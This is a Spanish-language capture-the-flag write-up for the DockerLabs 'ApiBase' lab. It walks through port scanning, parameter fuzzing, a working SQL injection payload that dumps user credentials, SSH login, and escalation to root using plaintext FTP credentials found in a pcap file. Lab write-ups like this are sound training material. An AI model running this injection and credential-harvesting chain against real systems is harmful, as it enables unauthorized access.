---
title: "DockerLabs - ApiBase"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar el abuso de una API REST e inyección SQL para obtener acceso, con escalada de privilegios analizando el tráfico de red.

## Despliegue

```bash
bash auto_deploy.sh apibase.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **5000/tcp** — HTTP (Werkzeug / Python 3.9)

## Enumeración API REST

La raíz de la API revela los endpoints disponibles:

```bash
curl -s http://172.17.0.2:5000/
# {"message": "No endpoint selected. Please use /add to add a user or /users to query users."}
```

Fuzzing del parámetro de `/users`:

```bash
for p in "username" "user" "id" "name" "query"; do
  resp=$(curl -s "http://172.17.0.2:5000/users?$p=test")
  echo "$p -> $resp"
done
```

Parámetro válido: `username`.

## Inyección SQL

```bash
curl -s "http://172.17.0.2:5000/users?username=' OR '1'='1'--"
```

Respuesta:

```json
[
  [1, "pingu", "your_password"],
  [2, "pingu", "pinguinasio"]
]
```

## Intrusión

```bash
ssh pingu@172.17.0.2
# contraseña: pinguinasio
```

## Escalada de Privilegios — Análisis de tráfico de red

En `/home` hay un archivo `network.pcap` con credenciales FTP en texto plano:

```
LOGIN root
PASS balulero
Access Denied
```

```bash
su root
# contraseña: balulero
whoami
# root
```

## Conclusión

Cadena de ataque: API REST sin auth → SQLi en `/users?username=` → SSH → pcap con credenciales FTP en texto plano → root.
